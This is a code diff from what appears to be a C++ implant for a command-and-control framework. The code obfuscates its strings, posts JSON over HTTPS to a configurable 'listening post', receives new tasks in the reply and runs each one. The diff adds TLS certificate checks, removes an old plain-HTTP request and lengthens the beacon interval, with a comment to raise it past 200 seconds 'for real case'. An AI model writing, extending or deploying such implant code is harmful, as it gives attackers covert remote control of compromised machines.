@@ -40,12 +40,16 @@ using json = nlohmann::json;
     auto const httpVersion = 11;
     auto const requestBody = json::parse(payload);
 
-    //construct listening post endpoint URL, only HTTp
+    //construct listening post endpoint URL
     std::stringstream ss;
     ss << XOR_STR("https://") << serverAddress << ":" << serverPort << serverUri;
     std::string fullServerUrl = ss.str();
 
-
+    cpr::SslOptions sslOpts = cpr::Ssl(
+        cpr::ssl::VerifyHost{ true },
+        cpr::ssl::VerifyPeer{ true },
+        cpr::ssl::CaInfo{ "cert.pem" }
+    );
 
     cpr::AsyncResponse asyncRequest = cpr::PostAsync(
         cpr::Url{ fullServerUrl },
@@ -56,21 +60,13 @@ using json = nlohmann::json;
         cpr::CertInfo{ "cert.pem" }  // path to CA cert bundle
     );
 
-
-
-    // //make an async HTTP POST req. to listening post
-    // cpr::AsyncResponse asyncRequest = cpr::PostAsync(cpr::Url{ fullServerUrl },
-    //     cpr::Body{ requestBody.dump() },
-    //     cpr::Header{ {"Content-Type", "application/json"} }
-    // );
-
     //retrieve response
     cpr::Response response = asyncRequest.get();
 
     //show request contents
     DEBUG_LOG(XOR_STR("Request body: ") << requestBody);
 
-    //return body of the response from listening post, may include new tasks
+    //return body of the response from listening post, THIS IS WHERE NEW TASKS ARE RECEIVED
     return response.text;
 
 };
@@ -129,7 +125,7 @@ void NetSession::serviceTasks() {
         }
 
         for (const auto& task: localTasks) {
-            //call run() and each task
+            //call run() on each task
             const auto [id, contents, success] = std::visit([](const auto& task) {return task.run(); }, task);
 
             {
@@ -177,9 +173,7 @@ NetSession::NetSession(std::string host, std::string port, std::string uri) :
     uri{ std::move(uri) },
 
     isRunning{ true },
-    dwellDistributionSeconds{ 1. }
-
-    // taskThread{ std::async(std::launch::async, [this] { serviceTasks(); }) } 
+    dwellDistributionSeconds{ 10. } //make this longer for real case (~ >200)
 {
 }
 
